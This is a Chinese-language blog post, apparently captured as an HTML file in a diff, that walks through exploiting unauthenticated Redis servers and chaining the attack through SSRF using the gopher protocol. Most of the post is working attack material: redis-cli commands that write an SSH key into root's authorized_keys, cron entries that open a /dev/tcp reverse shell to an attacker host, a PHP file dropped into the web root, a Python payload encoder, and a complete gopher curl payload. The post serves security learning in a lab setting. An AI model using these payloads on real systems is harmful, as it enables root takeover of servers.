@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          redis未授权访问与ssrf利用 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/08/redis未授权访问与ssrf利用/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#redis" title="redis">redis</a>
+                        
+                          <a class="tag" href="/tags/#ssrf" title="ssrf">ssrf</a>
+                        
+                    </div>
+                    <h1>redis未授权访问与ssrf利用</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-08-17
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><h2 id="About-Redis"><a href="#About-Redis" class="headerlink" title="About Redis"></a>About Redis</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>redis是一种key-value键值对的非关系型数据库，默认运行在6379端口</p>
+<p>它启动时不会像apache一样，以一种www-data低权限身份运行。而是以运行者的身份，例如用root权限直接运行redis时，redis的权限就是root权限</p>
+<p>其次它的默认配置是无需密码的，也就造成了默认的未授权访问</p>
+<p>redis还支持本地存储，也就导致了任意文件写入。从而可以写入私钥，利用私钥直接ssh登录服务器。</p>
+<h3 id="一些常用命令"><a href="#一些常用命令" class="headerlink" title="一些常用命令"></a>一些常用命令</h3><p>连接redis</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">redis-cli</span> <span class="selector-tag">-h</span> 192<span class="selector-class">.168</span><span class="selector-class">.85</span><span class="selector-class">.132</span></span><br></pre></td></tr></table></figure>
+<p>查看版本信息</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.85.132:6379</span>&gt;info</span><br></pre></td></tr></table></figure>
+<p>查看键为x的值</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.85.132:6379</span>&gt;get x</span><br></pre></td></tr></table></figure>
+<p>查看所有键</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.85.132:6379</span>&gt;keys *</span><br></pre></td></tr></table></figure>
+<p>设置x的值为test</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.85.132:6379</span>&gt;set x <span class="string">"test"</span></span><br></pre></td></tr></table></figure>
+<p>删除所有键</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.85.132:6379</span>&gt;flushall</span><br></pre></td></tr></table></figure>
+<p>设置redis本地存储的文件夹和文件名</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.85.132:6379</span>&gt;config set dir /root/.ssh </span><br><span class="line"><span class="number">192.168.85.132:6379</span>&gt;config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><p>操作系统：ubuntu 16.04</p>
+<p>ip ：192.168.85.128</p>
+<p>安装redis</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> update</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> install redis-server</span><br></pre></td></tr></table></figure>
+<h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>操作系统： centos 6.5</p>
+<p>ip ：192.168.85.132</p>
+<p>下载编译redis</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//download.redis.io/releases/redis-3.2.0.tar.gz</span></span><br><span class="line">tar xzvf redis-<span class="number">3.2</span>.<span class="number">0</span><span class="selector-class">.tar</span>.gz</span><br><span class="line">cd redis-<span class="number">3.2</span>.<span class="number">0</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>修改下配置文件，不然默认虽然是无密码，但是会有protected模式，导致无法从外部主机连接</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> redis.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>
+<p>bind 127.0.0.1前面加上#号   protected-mode设为no </p>
+<p>启动redis</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/src/</span>redis-server redis.conf</span><br></pre></td></tr></table></figure>
+<h2 id="写入ssh-keygen公钥"><a href="#写入ssh-keygen公钥" class="headerlink" title="写入ssh-keygen公钥"></a>写入ssh-keygen公钥</h2><p>现在下先在本地生成一对密钥</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kingkk<span class="variable">@ubuntu</span><span class="symbol">:~/</span>.ssh<span class="variable">$ </span>ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p>这样就可以在~/.ssh目录下生成一对<code>id_rsa</code>、<code>id_rsa.pub</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/redis未授权访问与ssrf利用/1.png" alt></p>
+<p>然后连接靶机redis</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kingkk@ubuntu:~/test/redis$ redis-cli -h 192.168.85.132           # 连接靶机</span><br><span class="line">192.168.85.132:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dir /root/.ssh                    # 设置本地存储文件目录</span><br><span class="line">OK</span><br><span class="line">192.168.85.132:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename authorized_keys        # 设置本地存储文件名</span><br><span class="line">OK</span><br><span class="line">192.168.85.132:6379&gt; <span class="builtin-name">set</span> x <span class="string">"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjFdA5iENqT7mVAv3kopJZi0jtaDbXq2VwX7AM4Gk8wkAgBjnNGuxP0Tt5Sz0sQY1brgP7pmtTCeXUhPS33qK9RWXHNNuAAnns3c5nTtEuKvZtE+5aFDiVvyjDBhvR9YfzQFc+MgCDNedF6Fe+tzSPxDvqk5hGUoqEgwQS0NQNEIN93qN/qEiCXrUMacy6JS6fa2AC99JO+0LdVB0yMPgW2neJZSoJOYdFdJiW4XSn94aUf/mHmZQbT2VxNHv1nEspyhssTaNzDrBAE60hL91Q+CEO2ir2sSZ95xwJXJQJbeD1HyyiAhwg/ajoBafT45Ae5BjY+cH9a8gCpzXu8Tp7 kingkk@ubuntu\n\n\n"</span>                                  		                           # 设置一个值为id_rsa.pub公钥值</span><br><span class="line">OK</span><br><span class="line">192.168.85.132:6379&gt; save                                         # 存储数据</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>这样，我们就把公钥写入对方的服务器了，直接用生成的私钥连接即可</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kingkk<span class="variable">@ubuntu</span><span class="symbol">:~/</span>.ssh<span class="variable">$ </span>ssh -i id_rsa root<span class="variable">@192</span>.<span class="number">168.85</span>.<span class="number">132</span></span><br><span class="line">Last <span class="symbol">login:</span> Sun Mar <span class="number">11 03</span><span class="symbol">:</span><span class="number">50:15</span> <span class="number">2018</span> from <span class="number">172.22</span>.<span class="number">224.117</span></span><br><span class="line">[root<span class="variable">@localhost</span> ~]<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) 组=0(root) 环境=<span class="symbol">unconfined_u:</span><span class="symbol">unconfined_r:</span><span class="symbol">unconfined_t:</span>s0-<span class="symbol">s0:</span>c0.c1023</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/spool/mail/root</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/redis未授权访问与ssrf利用/2.png" alt></p>
+<p>假如报了如下错误</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sign_and_send_pubkey:</span> signing <span class="string">failed:</span> agent refused operation</span><br></pre></td></tr></table></figure>
+<p>运行下如下两句即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">"<span class="variable">$(ssh-agent -s)</span>"</span></span><br><span class="line">ssh-add</span><br></pre></td></tr></table></figure>
+<h2 id="利用计划任务反弹shell"><a href="#利用计划任务反弹shell" class="headerlink" title="利用计划任务反弹shell"></a>利用计划任务反弹shell</h2><p>先开一个终端监听本地的23333端口</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp <span class="number">23333</span></span><br></pre></td></tr></table></figure>
+<p>利用之前类似的文件写入，写入定时命令</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.85.132:6379&gt; <span class="builtin-name">set</span> x <span class="string">"\n* * * * * /bin/bash -i &gt; /dev/tcp/192.168.85.128/23333 0&lt;&amp;1 2&gt;&amp;1\n"</span></span><br><span class="line">OK</span><br><span class="line">192.168.85.132:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dir /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line">192.168.85.132:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.85.132:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>需要等待一会，一般一分钟之内吧，nc就能收到反弹回来的shell了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/redis未授权访问与ssrf利用/3.png" alt></p>
+<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p>当redis权限较低，上面两种方法都行不通的时候，可以尝试往web服务中写入一句话，获取webshell</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.85.132:6379&gt; <span class="builtin-name">set</span> x <span class="string">"&lt;?php phpinfo();?&gt;"</span></span><br><span class="line">OK</span><br><span class="line">192.168.85.132:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dir /var/www/html</span><br><span class="line">OK</span><br><span class="line">192.168.85.132:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.85.132:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>这样，就能在根目录下生成shell.php。访问一下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/redis未授权访问与ssrf利用/4.png" alt></p>
+<h1 id="结合SSRF"><a href="#结合SSRF" class="headerlink" title="结合SSRF"></a>结合SSRF</h1><p>之前能看到，默认情况下虽然是没有密码，但是会开启<code>protected</code>保护模式</p>
+<p>在这情况下，我们尝试连接一下对方redis</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kingkk@ubuntu:~/test/redis$ redis-cli -h 192.168.85.132</span><br><span class="line">192.168.85.132:6379&gt; info</span><br><span class="line">DENIED Redis is running <span class="keyword">in</span> protected mode because protected mode is enabled, <span class="literal">no</span> bind<span class="built_in"> address </span>was specified, <span class="literal">no</span> authentication password is requested <span class="keyword">to</span> clients. <span class="keyword">In</span> this mode connections are only accepted <span class="keyword">from</span> the loopback interface. <span class="keyword">If</span> you want <span class="keyword">to</span> connect <span class="keyword">from</span> external computers <span class="keyword">to</span> Redis you may adopt one of the following solutions: 1) Just <span class="builtin-name">disable</span> protected mode sending the command <span class="string">'CONFIG SET protected-mode no'</span> <span class="keyword">from</span> the loopback<span class="built_in"> interface </span>by connecting <span class="keyword">to</span> Redis <span class="keyword">from</span> the same host the<span class="built_in"> server </span>is running, however MAKE SURE Redis is <span class="keyword">not</span> publicly accessible <span class="keyword">from</span> internet <span class="keyword">if</span> you <span class="keyword">do</span> so. Use<span class="built_in"> CONFIG </span>REWRITE <span class="keyword">to</span> make this change permanent. 2) Alternatively you can just <span class="builtin-name">disable</span> the protected mode by editing the Redis configuration file, <span class="keyword">and</span> setting the protected mode option <span class="keyword">to</span> <span class="string">'no'</span>, <span class="keyword">and</span> then restarting the server. 3) <span class="keyword">If</span> you started the<span class="built_in"> server </span>manually just <span class="keyword">for</span> testing, restart it with the <span class="string">'--protected-mode no'</span> option. 4) Setup a bind<span class="built_in"> address </span><span class="keyword">or</span> an authentication password. NOTE: You only need <span class="keyword">to</span> <span class="keyword">do</span> one of the above things <span class="keyword">in</span> order <span class="keyword">for</span> the<span class="built_in"> server </span><span class="keyword">to</span> start accepting connections <span class="keyword">from</span> the outside.</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/redis未授权访问与ssrf利用/5.png" alt></p>
+<p>可以看到保护模式拒绝了redis的远程连接，所以经常redis都是配合着ssrf这个可以伪造身份的攻击方式一起进行攻击</p>
+<h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><blockquote>
+<p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。  Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 </p>
+</blockquote>
+<p>可以利用gopher协议传输redis的数据报文，达到类似之前对redis的连接、设置、存储操作</p>
+<h2 id="抓取数据报文"><a href="#抓取数据报文" class="headerlink" title="抓取数据报文"></a>抓取数据报文</h2><p>在靶机中利用socat抓取发往redis的数据报文</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">socat</span> <span class="selector-tag">-v</span> <span class="selector-tag">tcp-listen</span><span class="selector-pseudo">:4444</span>,<span class="selector-tag">fork</span> <span class="selector-tag">tcp-connect</span><span class="selector-pseudo">:localhost</span><span class="selector-pseudo">:6379</span></span><br></pre></td></tr></table></figure>
+<p>在攻击机中连接靶机的4444端口，重新发送攻击payload</p>
+<p>这里先将要执行的命令写入了shell.sh中，方便一次性执行完毕</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo -e <span class="string">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n"</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="builtin-name">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span><span class="built_in"> config </span><span class="builtin-name">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span><span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br></pre></td></tr></table></figure>
+<p>然后在把靶机中执行</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shell.sh <span class="number">192.168</span><span class="number">.85</span><span class="number">.132</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+<p>返回五个OK就表示执行成功了</p>
+<p>然后就能看到靶机中接受到的数据流了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/redis未授权访问与ssrf利用/6.png" alt></p>
+<p>然后将这些数据流复制下来，需要将数据流中的<code>127.0.0.1/2333</code>转化成所需要的ip地址和端口</p>
+<p>同时需要修改<code>$61\r</code>中的61数字，表示数据的长度</p>
+<p>如我这里需要改成<code>192.168.85.128/23333</code>比原先多了6个字符串就是<code>$67\r</code></p>
+<h2 id="利用gopher进行攻击"><a href="#利用gopher进行攻击" class="headerlink" title="利用gopher进行攻击"></a>利用gopher进行攻击</h2><p>然后将数据转换成gopher协议的格式</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">line</span> <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">line</span>[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            continue</span><br><span class="line">        elif <span class="built_in">line</span>[<span class="number">-3</span>:<span class="number">-1</span>] == r<span class="string">'\r'</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">line</span>) == <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">line</span> = <span class="built_in">line</span>.<span class="built_in">replace</span>(r<span class="string">'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="built_in">line</span> = <span class="built_in">line</span>.<span class="built_in">replace</span>(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="built_in">line</span></span><br><span class="line">        elif <span class="built_in">line</span> == <span class="string">'\x0a'</span>:</span><br><span class="line">            <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">line</span> = <span class="built_in">line</span>.<span class="built_in">replace</span>(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="built_in">line</span></span><br><span class="line">print <span class="built_in">exp</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/redis未授权访问与ssrf利用/8.png" alt></p>
+<p>然后在本地先监听23333端口</p>
+<p>再利用curl发送payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> -v 'gopher://192.168.85.132:6379/_*3<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$3</span><span class="number">%0</span>d<span class="number">%0</span>aset<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$1</span><span class="number">%0</span>d<span class="number">%0</span>a1<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$67</span><span class="number">%0</span>d<span class="number">%0</span>a-e <span class="number">%0</span>a<span class="number">%0</span>a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.85.128/23333 0&gt;&amp;1<span class="number">%0</span>a<span class="number">%0</span>a<span class="number">%0</span>a<span class="number">%0</span>a<span class="number">%0</span>d<span class="number">%0</span>a*4<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$6</span><span class="number">%0</span>d<span class="number">%0</span>aconfig<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$3</span><span class="number">%0</span>d<span class="number">%0</span>aset<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$3</span><span class="number">%0</span>d<span class="number">%0</span>adir<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$16</span><span class="number">%0</span>d<span class="number">%0</span>a/var/spool/cron/<span class="number">%0</span>d<span class="number">%0</span>a*4<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$6</span><span class="number">%0</span>d<span class="number">%0</span>aconfig<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$3</span><span class="number">%0</span>d<span class="number">%0</span>aset<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$10</span><span class="number">%0</span>d<span class="number">%0</span>adbfilename<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$4</span><span class="number">%0</span>d<span class="number">%0</span>aroot<span class="number">%0</span>d<span class="number">%0</span>a*1<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$4</span><span class="number">%0</span>d<span class="number">%0</span>asave<span class="number">%0</span>d<span class="number">%0</span>a*1<span class="number">%0</span>d<span class="number">%0</span>a<span class="number">$4</span><span class="number">%0</span>d<span class="number">%0</span>aquit<span class="number">%0</span>d<span class="number">%0</span>a'</span><br></pre></td></tr></table></figure>
+<p>等待一会，就能看到nc接到了反弹回来的shell</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/redis未授权访问与ssrf利用/9.png" alt></p>
+<p>在php中的ssrf的话需要安装gopher协议拓展，就可以达到一样的效果。</p>
+<h1 id="自动化利用"><a href="#自动化利用" class="headerlink" title="自动化利用"></a>自动化利用</h1><p>我将之前的三种利用方式都写成了.sh的脚本形式，方便使用,只需本地要提前安装好redis</p>
+<p><a href="https://github.com/kingkaki/Exploit-scripts/tree/master/redis" target="_blank" rel="noopener">https://github.com/kingkaki/Exploit-scripts/tree/master/redis</a> 还包含了socat捕获的流量报文样例</p>
+<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/redis未授权访问与ssrf利用/1.gif" alt></p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="shell-sh"><a href="#shell-sh" class="headerlink" title="shell.sh"></a>shell.sh</h3><p>用法</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shell.sh <span class="comment">[redis-ip]</span> <span class="comment">[redis端口]</span> <span class="comment">[接收shell的ip]</span></span><br></pre></td></tr></table></figure>
+<p>默认端口为23333</p>
+<h3 id="ssh-sh"><a href="#ssh-sh" class="headerlink" title="ssh.sh"></a>ssh.sh</h3><p>用法</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssh.sh <span class="comment">[redis-ip]</span> <span class="comment">[redis端口]</span></span><br></pre></td></tr></table></figure>
+<p>要提前在本地<code>.ssh</code>目录用<code>ssh-keygen -t rsa</code>生成一对密钥</p>
+<p>然后用私钥登录即可</p>
